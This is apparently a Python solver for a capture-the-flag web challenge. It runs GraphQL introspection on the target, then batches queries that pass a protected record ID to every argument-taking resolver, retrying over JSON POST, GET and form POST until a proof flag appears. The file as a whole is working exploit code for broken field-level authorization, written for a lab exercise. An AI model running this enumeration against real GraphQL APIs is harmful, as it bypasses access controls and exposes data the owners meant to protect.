"""D25 "Resolver Revolt" (web-exploitation-day-18-resolver-revolt): GraphQL resolver with incomplete field-level authz.

Kit shape: /api/clues = {current_user, feature_route, protected_reference, note}; feature_route is a GraphQL endpoint
(GET -> 404 not_found, POST JSON {"query"} works). Introspection exposes Query{caseIndex:[CaseReference], case(id:ID!):
Case{id,title,note}}; the single's `case(id:<protected_reference>){note}` resolver skipped the field check and returned
note=proof_... Schema-driven here: every Query field that takes an arg is called with the protected reference and all
scalar fields of its return type selected. "Vary the protocol surface" -> if POST JSON misses, retry the same query
via GET ?query= and form-encoded POST. Returns None when the endpoint isn't GraphQL. Re-runnable on any fresh target.
"""
import json
import re
import urllib.parse

from lib import websolve

_INTRO = ("{__schema{queryType{name fields{name args{name type{name kind ofType{name kind ofType{name}}}} "
          "type{name kind ofType{name kind ofType{name kind}}}}} types{name kind fields{name type{name kind "
          "ofType{name kind ofType{name kind}}}}}}}")


def _j(body):
    try:
        return json.loads(body or "")
    except Exception:
        return {}


def _base_type(t):
    while isinstance(t, dict) and t.get("ofType") and not t.get("name"):
        t = t["ofType"]
    return (t or {}).get("name"), (t or {}).get("kind")


def _gql(url, query):
    """POST JSON, then GET ?query=, then form POST; first response carrying `data` or a proof wins."""
    tries = (
        lambda: websolve.fetch(url, headers={"Content-Type": "application/json"},
                               data=json.dumps({"query": query}).encode()),
        lambda: websolve.fetch(url + ("&" if "?" in url else "?") + urllib.parse.urlencode({"query": query})),
        lambda: websolve.fetch(url, data={"query": query}),
    )
    last = ""
    for t in tries:
        _, body, _ = t()
        if websolve.PROOF_RE.search(body or "") or isinstance(_j(body).get("data"), dict):
            return body
        last = body or last
    return last


def exploit(base, clues):
    cl = clues if isinstance(clues, dict) else {}
    routes = [v for k, v in cl.items() if isinstance(v, str) and re.fullmatch(r"/[\w./-]+", v)
              and not v.startswith("/api/clues")]
    ref = next((v for k, v in cl.items() if re.search(r"protected|private|target|reference", k, re.I)
                and not re.search(r"public|route", k, re.I) and isinstance(v, (int, str))), None)
    for route in routes + ["/graphql"]:
        url = urllib.parse.urljoin(base, route)
        schema = (_j(_gql(url, _INTRO)).get("data") or {}).get("__schema")
        if not isinstance(schema, dict):
            continue
        types = {t.get("name"): t for t in schema.get("types") or [] if isinstance(t, dict)}

        def sel(tname, depth=0):
            fs = []
            for f in (types.get(tname) or {}).get("fields") or []:
                n, k = _base_type(f.get("type"))
                if k in ("SCALAR", "ENUM"):
                    fs.append(f["name"])
                elif k == "OBJECT" and depth < 1 and not str(n).startswith("__"):
                    sub = sel(n, depth + 1)
                    if sub:
                        fs.append(f["name"] + sub)
            return "{" + " ".join(fs) + "}" if fs else ""

        parts = []
        for i, f in enumerate((schema.get("queryType") or {}).get("fields") or []):
            tname, kind = _base_type(f.get("type"))
            s = "" if kind in ("SCALAR", "ENUM") else sel(tname)
            if kind not in ("SCALAR", "ENUM") and not s:
                continue
            args = f.get("args") or []
            if args:
                if ref is None:
                    continue
                a = next((x for x in args if re.search(r"id|ref", x["name"], re.I)), args[0])
                parts.append("q%d:%s(%s:%s)%s" % (i, f["name"], a["name"], json.dumps(str(ref)), s))
            else:
                parts.append("q%d:%s%s" % (i, f["name"], s))
        if not parts:
            continue
        p = websolve.proof(_gql(url, "{" + " ".join(parts) + "}"))
        if p:
            return p
        # per-field fallback: one resolver erroring must not null the others
        for q in parts:
            p = websolve.proof(_gql(url, "{" + q + "}"))
            if p:
                return p
        return None
    return None


# protected_reference is shared with Day 14/24's API-inventory kit: dispatch on it only beside this kit's
# note / current_user (lib.web.handlers KEY_COMPANIONS)
KEY_MAP = [(r"resolver|graphql|schema|case_index", "day25_web_resolver_revolt"),
           (r"protected_reference", "day25_web_resolver_revolt")]
KEY_COMPANIONS = {r"protected_reference": r"^(note|current_user)$"}
HANDLERS = {"day25_web_resolver_revolt": exploit}
